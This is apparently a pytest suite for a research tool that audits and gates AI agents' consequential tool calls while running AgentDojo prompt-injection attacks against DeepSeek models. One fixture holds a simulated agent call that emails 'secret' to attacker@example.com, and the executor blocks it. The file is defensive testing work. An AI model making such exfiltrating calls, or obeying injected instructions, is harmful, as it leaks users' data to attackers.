import json
import importlib.util
from pathlib import Path
import sys
from types import SimpleNamespace

import pytest
from agentdojo.functions_runtime import FunctionCall, FunctionsRuntime
from agentdojo.attacks.base_attacks import get_model_name_from_pipeline
from agentdojo.types import ChatAssistantMessage, ChatSystemMessage, text_content_block_from_string
from openai import OpenAI

from tool_call_auditor.config import PilotConfig
from tool_call_auditor.demo import BENIGN_DOCUMENT, DemoEnvironment, build_runtime
import tool_call_auditor.deepseek_llm as deepseek_module
from tool_call_auditor.deepseek_llm import DeepSeekLLM
from tool_call_auditor.data_export import export_dataset
from tool_call_auditor.executor import AuditedToolsExecutor
from tool_call_auditor.identifiers import episode_identifier
import tool_call_auditor.workspace_runner as runner_module
from tool_call_auditor.workspace_runner import run, validate_config


def test_workspace_manifest_is_valid_without_model() -> None:
    config = PilotConfig.from_yaml(Path("configs/workspace_pilot.yaml"))
    plan = validate_config(config, require_model=False)

    assert plan["suite"] == "workspace"
    assert plan["provider"] == "deepseek"
    assert plan["model"] == "deepseek-flash"
    assert plan["benchmark_version"] == "v1.2.2"
    assert plan["planned_primary_episodes"] == 120
    assert plan["planned_attack_goal_checks"] == 18
    assert plan["planned_total_agent_runs"] == 138


def test_expansion_plan_has_exact_batch_workload_without_api_calls() -> None:
    from scripts.collect_data import _plan_batches

    plan, batches = _plan_batches(Path("configs/real_trace_expansion_plan.yaml"))
    assert plan["plan_id"] == "workspace-real-traces-phase-1"
    assert len(batches) == 16
    reports = [validate_config(config, require_model=False) for _, config in batches]
    assert sum(report["planned_primary_episodes"] for report in reports) == 80
    assert sum(report["planned_attack_goal_checks"] for report in reports) == 7
    assert sum(report["planned_total_agent_runs"] for report in reports) == 87
    assert len(
        {
            task_id
            for _, config in batches
            for task_id in config.user_tasks
        }
    ) == 40
    assert {config.attack for _, config in batches} == {
        "important_instructions",
        "tool_knowledge",
    }
    assert len(
        {
            injection_task_id
            for _, config in batches
            for _, injection_task_id in (config.attacked_task_pairs or [])
        }
    ) == 14


def test_empty_task_selection_never_means_run_everything() -> None:
    with pytest.raises(ValueError, match="user_tasks must name"):
        PilotConfig(
            run_mode="benign_only",
            user_tasks=[],
            injection_tasks=[],
            consequential_tools=["send_email"],
        )


def test_benign_only_requires_explicitly_empty_injection_selection() -> None:
    with pytest.raises(ValueError, match="benign_only requires injection_tasks"):
        PilotConfig(
            run_mode="benign_only",
            user_tasks=["user_task_1"],
            injection_tasks=["injection_task_0"],
            consequential_tools=["send_email"],
        )


def test_failed_episode_is_retried_limited_and_does_not_stop_next_task(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config = PilotConfig(
        provider="deepseek",
        model="deepseek-flash",
        run_mode="benign_only",
        user_tasks=["user_task_1", "user_task_24"],
        injection_tasks=[],
        consequential_tools=["send_email"],
        decisions=["ALLOW"],
        repetitions=1,
        max_episode_attempts=2,
        output_dir=tmp_path / "runs",
        source_id="unit-test-source",
    )
    called_tasks = []

    def fake_benchmark(*args, user_tasks, **kwargs):
        task_id = user_tasks[0]
        called_tasks.append(task_id)
        if task_id == "user_task_1":
            raise RuntimeError("temporary task failure")
        return {
            "utility_results": {(task_id, "none"): True},
            "security_results": {(task_id, "none"): True},
            "injection_tasks_utility_results": {},
        }

    monkeypatch.setattr(runner_module, "build_pipeline", lambda *args, **kwargs: object())
    monkeypatch.setattr(
        runner_module, "benchmark_suite_without_injections", fake_benchmark
    )

    summaries = run(config)

    assert called_tasks == ["user_task_1", "user_task_1", "user_task_24"]
    assert [summary["status"] for summary in summaries] == [
        "failed",
        "failed",
        "completed",
    ]
    assert json.dumps(summaries)
    assert summaries[-1]["result"]["utility_results"] == {
        "user_task_24|none": True
    }
    run_dirs = list((config.output_dir / "runs").iterdir())
    manifest = json.loads((run_dirs[0] / "run_manifest.json").read_text())
    assert manifest["status"] == "completed_with_errors"
    status_lines = (run_dirs[0] / "task_status.jsonl").read_text().splitlines()
    assert len(status_lines) == 3
    assert json.loads(status_lines[0])["error"]["type"] == "RuntimeError"

    resumed = run(config, resume_run_id=run_dirs[0].name)
    assert resumed == []
    assert called_tasks == ["user_task_1", "user_task_1", "user_task_24"]


def test_remaining_work_file_selects_only_explicit_task(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    config = PilotConfig(
        provider="deepseek",
        model="deepseek-flash",
        run_mode="benign_only",
        user_tasks=["user_task_1", "user_task_24"],
        injection_tasks=[],
        consequential_tools=["send_email"],
        decisions=["ALLOW"],
        repetitions=1,
        output_dir=tmp_path / "runs",
    )
    remaining = tmp_path / "remaining.json"
    remaining.write_text(
        json.dumps([{"scenario": "benign", "user_task_id": "user_task_24"}]),
        encoding="utf-8",
    )
    called_tasks = []

    def fake_benchmark(*args, user_tasks, **kwargs):
        called_tasks.extend(user_tasks)
        return {"utility_results": {}}

    monkeypatch.setattr(runner_module, "build_pipeline", lambda *args, **kwargs: object())
    monkeypatch.setattr(
        runner_module, "benchmark_suite_without_injections", fake_benchmark
    )

    run(config, remaining_tasks_file=remaining)

    assert called_tasks == ["user_task_24"]


def test_phase_summary_aggregates_actual_batch_counts_and_refuses_overwrite(
    tmp_path: Path,
) -> None:
    import yaml

    from scripts.summarize_collection_plan import summarize_plan

    export_dirs = [tmp_path / "batch-a", tmp_path / "batch-b"]
    summaries = [
        {
            "source_ids": ["source-a"],
            "primary_episode_count": 3,
            "attack_goal_check_count": 1,
            "candidate_consequential_call_count": 2,
            "provider_api_request_count": 6,
            "task_group_coverage": ["workspace:user_task_1"],
            "attack_coverage": {"important_instructions": 2},
            "tool_coverage": {"send_email": 2},
            "injection_exposure": {
                "requested_attack_episode_count": 2,
                "injection_task_coverage": {"injection_task_0": 2},
                "confirmed_exposure_count": 1,
                "not_observed_count": 1,
                "confirmed_by_injection_task": {"injection_task_0": 1},
            },
            "errors": {"failed_task_attempt_count": 0, "failed_episode_count": 0},
            "duration_seconds": {
                "episode_sum": 8,
                "episode_count": 3,
                "api_request_sum": 6,
                "api_request_count": 4,
                "task_attempt_sum": 8,
            },
            "token_usage": {
                "prompt_tokens": 10,
                "completion_tokens": 5,
                "total_tokens": 15,
                "prompt_tokens_known_episode_count": 3,
                "prompt_tokens_missing_episode_count": 0,
            },
            "labels": {"all_null": True},
        },
        {
            "source_ids": ["source-b"],
            "primary_episode_count": 2,
            "attack_goal_check_count": 0,
            "candidate_consequential_call_count": 1,
            "provider_api_request_count": 3,
            "task_group_coverage": ["workspace:user_task_2"],
            "attack_coverage": {"tool_knowledge": 2},
            "tool_coverage": {"delete_file": 1},
            "injection_exposure": {
                "requested_attack_episode_count": 2,
                "injection_task_coverage": {"injection_task_1": 2},
                "confirmed_exposure_count": 2,
                "not_observed_count": 0,
                "confirmed_by_injection_task": {"injection_task_1": 2},
            },
            "errors": {"failed_task_attempt_count": 1, "failed_episode_count": 1},
            "duration_seconds": {
                "episode_sum": 4,
                "episode_count": 2,
                "api_request_sum": 3,
                "api_request_count": 2,
                "task_attempt_sum": 4,
            },
            "token_usage": {
                "prompt_tokens": 7,
                "completion_tokens": 3,
                "total_tokens": 10,
                "prompt_tokens_known_episode_count": 2,
                "prompt_tokens_missing_episode_count": 0,
            },
            "labels": {"all_null": True},
        },
    ]
    batches = []
    for index, (export_dir, summary) in enumerate(zip(export_dirs, summaries)):
        export_dir.mkdir()
        (export_dir / "collection_summary.json").write_text(json.dumps(summary))
        batches.append({"id": f"batch-{index}", "export_dir": str(export_dir)})
    plan_path = tmp_path / "plan.yaml"
    plan_path.write_text(
        yaml.safe_dump({"plan_id": "phase", "batches": batches}), encoding="utf-8"
    )
    output_path = tmp_path / "phase-summary.json"

    result_path = summarize_plan(plan_path, output_path)
    result = json.loads(result_path.read_text())

    assert result["primary_episode_count"] == 5
    assert result["candidate_consequential_call_count"] == 3
    assert result["attack_coverage"] == {
        "important_instructions": 2,
        "tool_knowledge": 2,
    }
    assert result["injection_exposure"]["confirmed_exposure_count"] == 3
    assert result["token_usage"]["total_tokens"] == 25
    assert result["duration_seconds"]["episodes_with_api_request_duration"] == 6
    assert result["duration_seconds"]["api_request_duration_sum_seconds"] == 9
    assert (
        result["duration_seconds"]["mean_api_request_duration_seconds_per_episode"]
        == 1.5
    )
    assert "api_request_count" not in result["duration_seconds"]
    with pytest.raises(FileExistsError, match="Refusing to overwrite"):
        summarize_plan(plan_path, output_path)


def test_runner_result_normalizes_nested_tuple_keys_for_json() -> None:
    actual_agentdojo_result = {
        "utility_results": {
        ("user_task_33", "injection_task_0"): True,
        },
        "security_results": {
        ("user_task_33", "injection_task_0"): False,
        },
        "injection_tasks_utility_results": {
        "injection_task_0": True,
        },
    }

    normalized = runner_module._jsonable_results(actual_agentdojo_result)
    serialized = json.dumps({"summaries": [{"result": normalized}]})

    assert json.loads(serialized)["summaries"][0]["result"] == {
        "utility_results": {"user_task_33|injection_task_0": True},
        "security_results": {"user_task_33|injection_task_0": False},
        "injection_tasks_utility_results": {"injection_task_0": True},
    }
    assert json.dumps(
        runner_module.to_jsonable(
            {
                "nested": [
                    {
                        ("user_task_1", "none"): (
                            {"security_results": {("user_task_1", "none"): False}},
                        )
                    }
                ]
            }
        )
    )


def test_collect_data_prints_tuple_key_summaries_as_json(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    script_path = Path(__file__).parents[1] / "scripts" / "collect_data.py"
    spec = importlib.util.spec_from_file_location("collect_data_json_under_test", script_path)
    assert spec is not None and spec.loader is not None
    collect_data = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(collect_data)

    config_path = tmp_path / "config.yaml"
    calls_path = tmp_path / "raw_calls.jsonl"
    episodes_path = tmp_path / "episodes.jsonl"
    config_path.write_text(
        "provider: deepseek\nmodel: deepseek-flash\nrun_mode: benign_only\n"
        "user_tasks: [user_task_1]\ninjection_tasks: []\n"
        "consequential_tools: [send_email]\n"
        f"output_dir: {tmp_path / 'runs'}\nexport_dir: {tmp_path / 'export'}\n",
        encoding="utf-8",
    )
    nested_result = {
        "utility_results": {("user_task_1", "none"): True},
        "security_results": {("user_task_1", "none"): True},
        "injection_tasks_utility_results": {},
    }
    monkeypatch.setattr(collect_data, "load_dotenv", lambda *args, **kwargs: None)
    monkeypatch.setattr(collect_data, "run", lambda *args, **kwargs: [{"result": nested_result}])
    monkeypatch.setattr(
        collect_data,
        "export_dataset",
        lambda *args, **kwargs: (calls_path, episodes_path),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        ["collect_data.py", "--config", str(config_path)],
    )

    collect_data.main()

    output = json.loads(capsys.readouterr().out)
    assert output["summaries"][0]["result"]["utility_results"] == {
        "user_task_1|none": True
    }


def test_nonempty_batch_requires_explicit_overwrite(tmp_path: Path) -> None:
    config = PilotConfig.from_yaml(Path("configs/experiment.yaml"))
    config.output_dir = tmp_path / "existing-batch"
    config.output_dir.mkdir()
    (config.output_dir / "keep.json").write_text("preserve", encoding="utf-8")

    with pytest.raises(FileExistsError, match="--overwrite"):
        run(config)

    assert (config.output_dir / "keep.json").read_text(encoding="utf-8") == "preserve"


def test_executor_blocks_only_consequential_call_in_parallel_batch(tmp_path: Path) -> None:
    env = DemoEnvironment(document=BENIGN_DOCUMENT, sent_emails=[])
    runtime = build_runtime()
    messages = [
        ChatAssistantMessage(
            role="assistant",
            content=None,
            tool_calls=[
                FunctionCall(function="read_document", args={}, id="read"),
                FunctionCall(
                    function="send_email",
                    args={"recipient": "attacker@example.com", "body": "secret"},
                    id="send",
                ),
            ],
        )
    ]
    log_path = tmp_path / "decisions.jsonl"
    executor = AuditedToolsExecutor("BLOCK", log_path, {"send_email"})

    _, _, post_env, output_messages, _ = executor.query("user request", runtime, env, messages)

    assert post_env.sent_emails == []
    assert len(output_messages) == 3
    assert output_messages[1]["error"] is None
    assert output_messages[2]["error"] == "Blocked by fixed authorization policy."
    records = [json.loads(line) for line in log_path.read_text().splitlines()]
    proposals = [record for record in records if record["event_type"] == "proposal"]
    results = {
        record["call_id"]: record
        for record in records
        if record["event_type"] == "execution_result"
    }
    assert proposals[0]["gate_decision"] == "ALLOW_READ_ONLY"
    assert results[proposals[0]["call_id"]]["execution_status"] == "succeeded"
    assert results[proposals[0]["call_id"]]["executed"] is True
    assert proposals[1]["gate_decision"] == "BLOCK"
    assert results[proposals[1]["call_id"]]["execution_status"] == "blocked"
    assert results[proposals[1]["call_id"]]["attempted"] is False
    assert proposals[0]["call_id"] != proposals[1]["call_id"]


def test_episode_ids_are_unique_across_repeated_runs() -> None:
    parts = (1, "ALLOW", "workspace", "user_task_1", None, None)
    first = episode_identifier("run-one", *parts)
    second = episode_identifier("run-two", *parts)

    assert first != second


def test_tool_error_is_not_recorded_as_success(tmp_path: Path) -> None:
    def fail() -> str:
        """A function that fails to exercise tool error logging."""
        raise RuntimeError("tool failed")

    runtime = FunctionsRuntime()
    runtime.register_function(fail)
    messages = [
        ChatAssistantMessage(
            role="assistant",
            content=None,
            tool_calls=[FunctionCall(function="fail", args={}, id="provider-call")],
        )
    ]
    log_path = tmp_path / "tool-errors.jsonl"
    executor = AuditedToolsExecutor("ALLOW", log_path, set())

    _, _, _, output_messages, _ = executor.query("request", runtime, messages=messages)

    assert output_messages[-1]["error"] == "RuntimeError: tool failed"
    records = [json.loads(line) for line in log_path.read_text().splitlines()]
    result = next(record for record in records if record["event_type"] == "execution_result")
    assert result["execution_status"] == "error"
    assert result["attempted"] is True
    assert result["tool_succeeded"] is False
    assert result["executed"] is False


def test_raw_call_export_excludes_future_observations(tmp_path: Path) -> None:
    source = tmp_path / "source"
    condition = source / "runs" / "run-1" / "repeat-1" / "allow"
    trace_dir = condition / "deepseek-flash-audit-allow" / "workspace" / "user_task_1" / "none"
    trace_dir.mkdir(parents=True)
    trace_episode_id = episode_identifier(
        "run-1", 1, "ALLOW", "workspace", "user_task_1", None, None
    )
    (source / "runs" / "run-1" / "run_manifest.json").write_text(
        json.dumps({"run_id": "run-1", "source_id": "source-batch-1"}), encoding="utf-8"
    )
    (condition / "api_requests.jsonl").write_text(
        "\n".join(
            json.dumps(
                {
                    "episode_id": trace_episode_id,
                    "usage": {"prompt_tokens": 3, "completion_tokens": 1, "total_tokens": 4},
                    "request_duration_seconds": duration,
                }
            )
            for duration in (0.1, 0.2)
        )
        + "\n",
        encoding="utf-8",
    )
    (condition / "tool_call_decisions.jsonl").write_text(
        "\n".join(
            json.dumps(
                {
                    "event_type": event,
                    "run_id": "run-1",
                    "episode_id": "episode-1",
                    "episode_kind": "primary",
                    "call_id": "run-1:call-1",
                    "provider_call_id": "provider-call",
                    "suite_name": "workspace",
                    "user_task_id": "user_task_1",
                    "injection_task_id": None,
                    "attack_type": None,
                    "consequential": True,
                    "tool_name": "send_email",
                    "tool_arguments": {"body": "hello"},
                    "original_user_request": "Send the message",
                    "observation_provenance": [
                        {"tool_name": "read_file", "content": "Only a prior observation"}
                    ],
                    "execution_status": status,
                    "label": None,
                }
            )
            for event, status in (
                ("proposal", "not_attempted"),
                ("execution_result", "succeeded"),
            )
        )
        + "\n",
        encoding="utf-8",
    )
    with (condition / "tool_call_decisions.jsonl").open("a", encoding="utf-8") as stream:
        stream.write(
            json.dumps(
                {
                    "user_task_id": "injection_task_0",
                    "consequential": True,
                    "tool_name": "send_email",
                    "tool_arguments": {},
                }
            )
            + "\n"
        )
    (trace_dir / "none.json").write_text(
        json.dumps(
            {
                "suite_name": "workspace",
                "user_task_id": "user_task_1",
                "injection_task_id": None,
                "attack_type": None,
                "utility": True,
                "security": True,
                "messages": [
                    {
                        "role": "tool",
                        "content": [{"type": "text", "content": "FUTURE_OBSERVATION_SECRET"}],
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    calls_path, episodes_path = export_dataset(source, tmp_path / "export")
    raw_calls = calls_path.read_text(encoding="utf-8")
    episode = json.loads(episodes_path.read_text(encoding="utf-8"))
    summary = json.loads((tmp_path / "export" / "collection_summary.json").read_text())

    assert "FUTURE_OBSERVATION_SECRET" not in raw_calls
    assert "Only a prior observation" in raw_calls
    call = json.loads(raw_calls)
    assert call["label"] is None
    assert call["task_group_id"] == "workspace:user_task_1"
    assert call["source_id"] == "source-batch-1"
    assert call["execution_status"] == "succeeded"
    assert len([line for line in raw_calls.splitlines() if line.strip()]) == 1
    assert episode["agentdojo_context"]["messages"][0]["role"] == "tool"
    assert episode["task_group_id"] == "workspace:user_task_1"
    assert summary["candidate_consequential_call_count"] == 1
    assert summary["provider_api_request_count"] == 2
    assert summary["duration_seconds"]["episodes_with_api_request_duration"] == 1
    assert summary["duration_seconds"]["api_request_duration_sum_seconds"] == pytest.approx(
        0.3
    )
    assert "api_request_count" not in summary["duration_seconds"]
    assert summary["labels"]["all_null"] is True


@pytest.mark.parametrize(
    ("user_task_id", "injection_task_id", "attack_type", "security", "expected"),
    [
        ("user_task_33", "injection_task_0", "important_instructions", False, False),
        ("user_task_33", "injection_task_0", "important_instructions", True, True),
        ("user_task_33", None, None, True, None),
        ("injection_task_0", None, None, True, None),
    ],
)
def test_attack_succeeded_uses_agentdojo_security_semantics(
    tmp_path: Path,
    user_task_id: str,
    injection_task_id: str | None,
    attack_type: str | None,
    security: bool,
    expected: bool | None,
) -> None:
    source = tmp_path / "source"
    trace_dir = (
        source
        / "runs"
        / "run-1"
        / "repeat-1"
        / "allow"
        / "pipeline"
        / "workspace"
        / user_task_id
        / (attack_type or "none")
    )
    trace_dir.mkdir(parents=True)
    (source / "runs" / "run-1" / "run_manifest.json").write_text(
        json.dumps({"run_id": "run-1", "source_id": "source-batch-1"}), encoding="utf-8"
    )
    injection_filename = injection_task_id or "none"
    (trace_dir / f"{injection_filename}.json").write_text(
        json.dumps(
            {
                "suite_name": "workspace",
                "user_task_id": user_task_id,
                "injection_task_id": injection_task_id,
                "attack_type": attack_type,
                "utility": True,
                "security": security,
                "injections": {"email_body": "untrusted injection"} if injection_task_id else {},
                "messages": [],
            }
        ),
        encoding="utf-8",
    )

    _, episodes_path = export_dataset(source, tmp_path / "export")
    episode = json.loads(episodes_path.read_text(encoding="utf-8"))

    assert episode["agentdojo_security_result"] is security
    assert episode["attack_succeeded"] is expected
    assert episode["source_id"] == "source-batch-1"
    assert episode["task_group_id"] == f"workspace:{user_task_id}"
    if injection_task_id:
        assert episode["injection_exposure"] == "exposed"


def test_export_only_does_not_call_runner(tmp_path: Path, monkeypatch) -> None:
    script_path = Path(__file__).parents[1] / "scripts" / "collect_data.py"
    spec = importlib.util.spec_from_file_location("collect_data_under_test", script_path)
    assert spec is not None and spec.loader is not None
    collect_data = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(collect_data)

    source = tmp_path / "source"
    trace = source / "run" / "deepseek" / "workspace" / "user_task_1" / "none"
    trace.mkdir(parents=True)
    (trace / "none.json").write_text(
        json.dumps(
            {
                "suite_name": "workspace",
                "user_task_id": "user_task_1",
                "injection_task_id": None,
                "attack_type": None,
                "utility": True,
                "messages": [],
            }
        ),
        encoding="utf-8",
    )
    config_path = tmp_path / "config.yaml"
    config_path.write_text(
        f"suite: workspace\nuser_tasks: [user_task_1]\ninjection_tasks: [injection_task_0]\n"
        f"consequential_tools: [send_email]\noutput_dir: {source}\n"
        f"export_dir: {tmp_path / 'export'}\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(
        collect_data,
        "run",
        lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("runner called")),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        ["collect_data.py", "--config", str(config_path), "--export-only"],
    )

    collect_data.main()

    assert (tmp_path / "export" / "episodes.jsonl").is_file()


def test_deepseek_adapter_uses_system_role() -> None:
    message = ChatSystemMessage(
        role="system", content=[text_content_block_from_string("Follow the user request.")]
    )
    converted = DeepSeekLLM._to_deepseek_message(message)

    assert converted["role"] == "system"


def test_deepseek_adapter_accepts_official_client() -> None:
    llm = DeepSeekLLM(
        OpenAI(api_key="test-key", base_url="https://api.deepseek.com"),
        model="deepseek-flash",
    )

    assert llm.name == "deepseek-flash"


def test_deepseek_request_telemetry_saves_usage_and_redacts_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    class Usage:
        def model_dump(self, mode: str) -> dict:
            return {
                "prompt_tokens": 12,
                "completion_tokens": 4,
                "total_tokens": 16,
                "prompt_tokens_details": {"cached_tokens": 2},
            }

    def successful_request(*args, **kwargs):
        return SimpleNamespace(
            choices=[
                SimpleNamespace(
                    message=SimpleNamespace(content="done", tool_calls=None)
                )
            ],
            usage=Usage(),
        )

    telemetry_path = tmp_path / "api_requests.jsonl"
    client = OpenAI(api_key="local-test-key", base_url="https://api.deepseek.com")
    monkeypatch.setattr(deepseek_module, "chat_completion_request", successful_request)
    llm = DeepSeekLLM(client, telemetry_path=telemetry_path, run_id="run-one")

    llm.query("request", FunctionsRuntime())

    record = json.loads(telemetry_path.read_text(encoding="utf-8"))
    assert record["usage"]["prompt_tokens"] == 12
    assert record["usage"]["prompt_tokens_details"]["cached_tokens"] == 2
    assert record["request_duration_seconds"] >= 0
    assert record["cost"] is None
    assert "local-test-key" not in telemetry_path.read_text(encoding="utf-8")
    assert "authorization" not in telemetry_path.read_text(encoding="utf-8").lower()

    def failed_request(request_client, *args, **kwargs):
        raise RuntimeError(f"request failed with key {request_client.api_key}")

    monkeypatch.setattr(deepseek_module, "chat_completion_request", failed_request)
    with pytest.raises(RuntimeError):
        llm.query("request", FunctionsRuntime())
    error_record = json.loads(telemetry_path.read_text(encoding="utf-8").splitlines()[-1])
    assert error_record["error"]["type"] == "RuntimeError"
    assert error_record["error"]["message"] == "request failed with key [REDACTED]"
    assert error_record["usage"] is None


def test_agentdojo_attack_can_address_deepseek() -> None:
    class Pipeline:
        name = "deepseek-flash-audit-allow"

    assert get_model_name_from_pipeline(Pipeline()) == "DeepSeek"
